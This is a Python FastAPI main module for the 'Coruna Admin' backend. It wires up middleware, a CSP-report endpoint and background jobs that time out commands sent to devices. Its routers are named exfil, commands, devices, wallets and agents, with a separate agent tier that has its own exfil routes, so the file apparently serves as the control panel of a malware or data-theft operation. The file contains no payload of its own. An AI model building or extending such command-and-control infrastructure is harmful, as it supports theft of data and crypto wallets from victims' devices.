import json
import logging
import os
from contextlib import asynccontextmanager
from pathlib import Path

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware

from . import config
from .database import init_db
from .auth import get_or_create_admin
from .limiter import limiter, LIMITER_AVAILABLE

from .routers import (
    auth as auth_router,
    two_factor as two_factor_router,
    report as report_router,
    devices as devices_router,
    exfil as exfil_router,
    commands as commands_router,
    channels as channels_router,
    templates as templates_router,
    wallets as wallets_router,
    dashboard as dashboard_router,
    logs as logs_router,
    audit as audit_router,
    notifications as notifications_router,
    settings as settings_router,
    users as users_router,
    agents as agents_router,
)
from .routers.agent import (
    auth as agent_auth_router,
    devices as agent_devices_router,
    exfil as agent_exfil_router,
    channels as agent_channels_router,
    templates as agent_templates_router,
    dashboard as agent_dashboard_router,
    profile as agent_profile_router,
    two_factor as agent_two_factor_router,
)

_log = logging.getLogger("coruna.cors")
_cors_allowed = frozenset(config.CORS_ORIGINS)
_cors_debug = os.getenv("CORS_DEBUG", "true").lower() in ("1", "true", "yes", "on")
_csp_connect_src_extras = list(_cors_allowed)

# CSP 违规报告去重缓存：键 = (blocked-uri, violated-directive, document-uri)，
# 值 = 上次记录时间戳。同键在 _CSP_DEDUP_WINDOW_SEC 秒内只记一次，避免日志刷屏。
import time as _time
_csp_dedup: dict = {}
_CSP_DEDUP_WINDOW_SEC = 300  # 5 分钟去重窗口
_CSP_DEDUP_MAX_KEYS = 2000   # 防止内存膨胀


class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        method = request.method
        path = request.url.path or "/"
        origin = request.headers.get("origin", "")
        referer = request.headers.get("referer", "")
        host_header = request.headers.get("host", "")
        ua = request.headers.get("user-agent", "")

        skip_log_paths = ("/assets/", "/docs", "/redoc", "/openapi.json", "/favicon")
        is_skip = any(path.startswith(p) for p in skip_log_paths)
        is_preflight = method == "OPTIONS"
        # 精确比较 origin 与 host：用 urlparse 提取 netloc，避免 endswith 字符串误判
        # （如 origin=http://evillocalhost:5173 + host=localhost:5173 会被 endswith 误判为同源）
        origin_netloc = ""
        if origin:
            try:
                from urllib.parse import urlparse as _urlparse
                origin_netloc = _urlparse(origin).netloc.lower()
            except Exception:
                origin_netloc = ""
        is_cross_origin = bool(origin) and (origin_netloc != host_header.lower())

        if _cors_debug and not is_skip:
            _log.info(
                "[CORS-REQ] %s %s origin=%s referer=%s ip=%s",
                method, path,
                origin[:120] if origin else "(none)",
                referer[:120] if referer else "(none)",
                request.client.host if request.client else "-",
            )
            if is_preflight:
                headers_list = request.headers.get("access-control-request-headers", "")
                methods_list = request.headers.get("access-control-request-method", "")
                origin_ok = (origin in _cors_allowed) or (
                    origin and any(origin.startswith(a) for a in _cors_allowed if a.startswith("http"))
                )
                _log.warning(
                    "[CORS-PREFLIGHT] origin=%s allow_origins=%s matched=%s req_method=%s req_headers=%s ua=%s",
                    origin,
                    ",".join(sorted(_cors_allowed)) or "(empty)",
                    origin_ok,
                    methods_list,
                    headers_list,
                    ua[:80],
                )

        try:
            response = await call_next(request)
        except Exception as exc:
            # 跨域请求中路由抛异常时，Starlette 内层 ServerErrorMiddleware 通常已兜底；
            # 此分支兜底额外记录异常，便于排查"500 时 CORS 头丢失"类问题
            _log.error(
                "[CORS-ERROR] %s %s origin=%s → unhandled: %s",
                method, path,
                origin[:80] if origin else "(none)",
                exc,
            )
            from fastapi.responses import JSONResponse as _JR
            response = _JR(status_code=500, content={"detail": "Internal Server Error", "error": "cors_mw_caught"})

        response.headers["X-Frame-Options"] = "SAMEORIGIN"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

        csp_parts = [
            "default-src 'self'",
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data: https: blob:",
            "connect-src 'self' ws: wss: http: https:",
        ]
        for o in _csp_connect_src_extras:
            csp_parts[-1] += f" {o}"
        csp_parts.extend([
            "font-src 'self' data:",
            "frame-src 'self' blob: about:",
            "frame-ancestors 'self'",
            "report-uri /api/csp-report",
        ])
        response.headers["Content-Security-Policy"] = "; ".join(csp_parts) + ";"
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"

        if _cors_debug and not is_skip and (is_preflight or is_cross_origin):
            acao = response.headers.get("access-control-allow-origin", "")
            acac = response.headers.get("access-control-allow-credentials", "")
            acah = response.headers.get("access-control-allow-headers", "")
            status_code = response.status_code
            # 同时记录 CSP 头是否设置成功（CSP 缺失会导致浏览器加载资源被静默阻止）
            csp_header = response.headers.get("content-security-policy", "")
            # 关键诊断：有 Origin 但响应无 ACAO → 跨域请求会被浏览器拦截
            missing_acao = bool(origin) and not acao
            _log.info(
                "[CORS-RESP] %s %s origin=%s → status=%s acao=%s acac=%s acah=%s csp=%s missing_acao=%s",
                method, path,
                origin[:80] if origin else "(none)",
                status_code, acao[:80] if acao else "-",
                acac, acah[:80] if acah else "-",
                "yes" if csp_header else "NO",
                missing_acao,
            )
            if missing_acao:
                _log.warning(
                    "[CORS-MISSING-ACAO] %s %s origin=%s not in allow_origins=%s → browser will block",
                    method, path,
                    origin[:80],
                    ",".join(sorted(_cors_allowed)) or "(empty)",
                )

        return response


FRONTEND_DIST = Path(__file__).resolve().parent.parent / "frontend" / "dist"


@asynccontextmanager
async def lifespan(app: FastAPI):
    import asyncio as _asyncio
    from .database import SessionLocal
    from .routers.notifications import _register_db_factory, register_main_loop
    try:
        register_main_loop(_asyncio.get_running_loop())
    except Exception:
        pass
    _register_db_factory(SessionLocal)
    db = SessionLocal()
    try:
        init_db()
        get_or_create_admin(db)
        from .settings_manager import ensure_default_settings
        ensure_default_settings(db)
    finally:
        db.close()

    # --------- 后台守护协程：全部阈值从 config_constants 读取，支持 .env + settings 表 + 默认兜底 ---------
    _bg_tasks = []

    async def _rotate_logs_cron():
        """每日 [rotate_start_hhmm, start + rotate_window_minutes] 区间自动跑一次 rotate_all。"""
        from datetime import datetime as _dt
        from .config_constants import cfg_int, cfg_str, parse_hhmm, DB_FILE as _unused1
        _ = _unused1
        while True:
            try:
                from .routers._rotate_logs import run_daily_if_needed
                db_tmp = SessionLocal()
                try:
                    tick_sec = cfg_int(db_tmp, "cron.rotate_tick_seconds")
                    start_hhmm = cfg_str(db_tmp, "cron.rotate_start_hhmm")
                    win_min = cfg_int(db_tmp, "cron.rotate_window_minutes")
                finally:
                    db_tmp.close()
                try:
                    sh, sm = parse_hhmm(start_hhmm)
                except ValueError:
                    sh, sm = 3, 30
                    win_min = max(1, min(120, int(win_min)))
                now = _dt.now()
                start_min_of_day = sh * 60 + sm
                end_min_of_day = start_min_of_day + max(1, min(120, int(win_min)))
                now_min = now.hour * 60 + now.minute
                force = False
                if start_min_of_day <= now_min < end_min_of_day:
                    force = True
                await run_daily_if_needed(force=force)
            except Exception:
                import logging as _lg
                _lg.getLogger("bg.rotate").exception("rotate_logs_cron failed")
            try:
                db_tick = SessionLocal()
                try:
                    tick = cfg_int(db_tick, "cron.rotate_tick_seconds")
                finally:
                    db_tick.close()
            except Exception:
                tick = 60
            await _asyncio.sleep(max(10, int(tick)))

    async def _command_timeout_guard():
        """每 cmd_timeout_tick_seconds 扫一次：commands.executing 超过 cmd_timeout_minutes → timeout + notification。"""
        from datetime import datetime, timedelta as _td
        while True:
            try:
                from sqlalchemy import select, and_, update
                from .database import Command, Notification, Device
                from .config_constants import cfg_int
                db2 = SessionLocal()
                try:
                    now = datetime.now()
                    timeout_min = max(1, cfg_int(db2, "cron.cmd_timeout_minutes"))
                    cutoff = now - _td(minutes=timeout_min)
                    stmt = (
                        select(Command.id, Command.device_uuid, Command.command, Command.created_at)
                        .where(and_(Command.status == "executing", Command.created_at < cutoff))
                    )
                    rows = db2.execute(stmt).fetchall()
                    if rows:
                        ids = [int(r[0]) for r in rows]
                        db2.execute(
                            update(Command)
                            .where(Command.id.in_(ids))
                            .values(status="timeout", executed_at=now)
                        )
                        for r in rows:
                            cid, duuid, cmd, cat = r
                            dev_model = ""
                            try:
                                dev = db2.execute(
                                    select(Device.device_model).where(Device.device_uuid == duuid).limit(1)
                                ).fetchone()
                                if dev and dev[0]:
                                    dev_model = str(dev[0])
                            except Exception:
                                pass
                            notif = Notification(
                                timestamp=now,
                                title=f"命令超时 # {cid}",
                                category="warning",
                                is_read=0,
                                related_device_uuid=duuid,
                                related_resource_type="command",
                                related_resource_id=str(cid),
                                message=(
                                    f"设备 {duuid}" + (f" ({dev_model})" if dev_model else "")
                                    + f" 命令执行超过 {timeout_min} 分钟未响应，已自动标记为 timeout。\n"
                                    + f"创建时间: {cat.isoformat(sep=' ', timespec='minutes') if cat else '-'}\n"
                                    + f"命令预览: {(str(cmd)[:200] + '...') if len(str(cmd)) > 200 else str(cmd)}"
                                )
                            )
                            db2.add(notif)
                        db2.commit()
                finally:
                    db2.close()
            except Exception:
                import logging as _lg
                _lg.getLogger("bg.timeout").exception("command_timeout_guard failed")
            try:
                db_tick = SessionLocal()
                try:
                    from .config_constants import cfg_int as _ci
                    sleep_sec = max(30, _ci(db_tick, "cron.cmd_timeout_tick_seconds"))
                finally:
                    db_tick.close()
            except Exception:
                sleep_sec = 300
            await _asyncio.sleep(sleep_sec)

    try:
        _bg_tasks.append(_asyncio.create_task(_rotate_logs_cron(), name="rotate_logs_cron"))
    except Exception:
        pass
    try:
        _bg_tasks.append(_asyncio.create_task(_command_timeout_guard(), name="command_timeout_guard"))
    except Exception:
        pass

    # ── 初始化 CORS/CSP 调试日志 ──
    try:
        _cors_logger = logging.getLogger("coruna.cors")
        if not _cors_logger.handlers:
            from logging.handlers import RotatingFileHandler
            _log_dir = Path(__file__).resolve().parent.parent / "logs"
            _log_dir.mkdir(parents=True, exist_ok=True)
            _handler = RotatingFileHandler(
                str(_log_dir / "cors_debug.log"),
                maxBytes=5 * 1024 * 1024,
                backupCount=3,
                encoding="utf-8",
            )
            _handler.setFormatter(logging.Formatter(
                "%(asctime)s [%(levelname)s] %(message)s",
                datefmt="%Y-%m-%d %H:%M:%S",
            ))
            _cors_logger.addHandler(_handler)
            _cors_logger.setLevel(logging.DEBUG if _cors_debug else logging.WARNING)
            _cors_logger.propagate = False
        _cors_logger.info(
            "[CORS-INIT] debug=%s origins=%s csp_report=/api/csp-report",
            _cors_debug, ",".join(sorted(_cors_allowed)),
        )
    except Exception:
        pass

    try:
        yield
    finally:
        for t in _bg_tasks:
            try:
                t.cancel()
            except Exception:
                pass


app = FastAPI(
    title="Coruna Admin API",
    description="Coruna Management Backend",
    version="1.0.0",
    lifespan=lifespan,
    docs_url="/docs",
    redoc_url="/redoc",
)

if LIMITER_AVAILABLE and limiter is not None:
    app.state.limiter = limiter
    try:
        from slowapi.errors import RateLimitExceeded
        from slowapi.util import get_remote_address
        app.state._rate_limit_remote = get_remote_address

        @app.exception_handler(RateLimitExceeded)
        async def rate_limit_handler(request: Request, exc: RateLimitExceeded):  # noqa: ARG001
            return JSONResponse(
                status_code=429,
                content={"detail": "请求过于频繁，请稍后重试", "error": "rate_limit_exceeded"}
            )
    except Exception:
        pass

app.add_middleware(
    CORSMiddleware,
    allow_origins=config.CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
app.add_middleware(SecurityHeadersMiddleware)


@app.get("/api/health", tags=["system"])
async def health_check():
    return {"status": "ok", "version": "1.0.0"}


@app.post("/api/csp-report", include_in_schema=False)
async def csp_report(request: Request):
    """接收浏览器 CSP 违规报告，日志落盘用于跨域排查。

    带去重：同一 (blocked-uri, violated-directive, document-uri) 在
    _CSP_DEDUP_WINDOW_SEC 秒内只记录一次，避免页面加载时大量相同违规刷爆日志。
    """
    try:
        body_bytes = await request.body()
        if not body_bytes:
            return JSONResponse(status_code=204, content={})
        body_text = body_bytes.decode("utf-8", errors="replace").strip()
        payload = None
        try:
            payload = json.loads(body_text)
        except Exception:
            payload = {"raw": body_text[:500]}
        report = payload.get("csp-report", payload) if isinstance(payload, dict) else payload
        if isinstance(report, dict):
            blocked = report.get("blocked-uri", "") or ""
            violated = report.get("violated-directive", report.get("effective-directive", "")) or ""
            doc_uri = report.get("document-uri", "") or ""
            dedup_key = (blocked, violated, doc_uri)
            now_ts = _time.time()
            last_ts = _csp_dedup.get(dedup_key)
            # 去重窗口内且键已存在 → 跳过日志，但仍返回 204 让浏览器关闭报告通道
            if last_ts is not None and (now_ts - last_ts) < _CSP_DEDUP_WINDOW_SEC:
                return JSONResponse(status_code=204, content={})
            # 记录/更新时间戳；超过容量时清空旧键防止内存膨胀
            if len(_csp_dedup) >= _CSP_DEDUP_MAX_KEYS:
                _csp_dedup.clear()
            _csp_dedup[dedup_key] = now_ts
            _log.warning(
                "[CSP-VIOLATION] blocked=%s violated=%s doc=%s original=%s sample=%s status=%s referer=%s",
                blocked,
                violated,
                doc_uri[:120],
                (report.get("original-policy", "") or "")[:120],
                (report.get("script-sample", "") or "")[:120],
                report.get("disposition", ""),
                report.get("referrer", "")[:120] if report.get("referrer") else "",
            )
        else:
            _log.warning("[CSP-VIOLATION] raw=%s", body_text[:300])
    except Exception as exc:
        _log.error("[CSP-VIOLATION] parse failed: %s", exc)
    return JSONResponse(status_code=204, content={})


app.include_router(auth_router.router)
app.include_router(two_factor_router.router)
app.include_router(report_router.router)
app.include_router(devices_router.router)
app.include_router(exfil_router.router)
app.include_router(commands_router.router)
app.include_router(channels_router.router)
app.include_router(templates_router.router)
app.include_router(wallets_router.router)
app.include_router(dashboard_router.router)
app.include_router(logs_router.router)
app.include_router(audit_router.router)
app.include_router(notifications_router.router)
app.include_router(settings_router.router)
app.include_router(users_router.router)
app.include_router(agents_router.router)

app.include_router(agent_auth_router.router)
app.include_router(agent_two_factor_router.router)
app.include_router(agent_devices_router.router)
app.include_router(agent_exfil_router.router)
app.include_router(agent_channels_router.router)
app.include_router(agent_templates_router.router)
app.include_router(agent_dashboard_router.router)
app.include_router(agent_profile_router.router)


if FRONTEND_DIST.exists() and FRONTEND_DIST.is_dir():
    app.mount("/assets", StaticFiles(directory=str(FRONTEND_DIST / "assets")), name="assets")

    @app.get("/{full_path:path}", response_class=HTMLResponse, include_in_schema=False)
    async def serve_frontend(full_path: str):
        if full_path.startswith("api/") or full_path == "docs" or full_path == "redoc" or full_path == "openapi.json":
            from fastapi import HTTPException
            raise HTTPException(status_code=404, detail="Not Found")
        index_html = FRONTEND_DIST / "index.html"
        if index_html.exists():
            return FileResponse(str(index_html), media_type="text/html")
        return HTMLResponse("<h1>Coruna Admin</h1><p>Frontend not built.</p>")
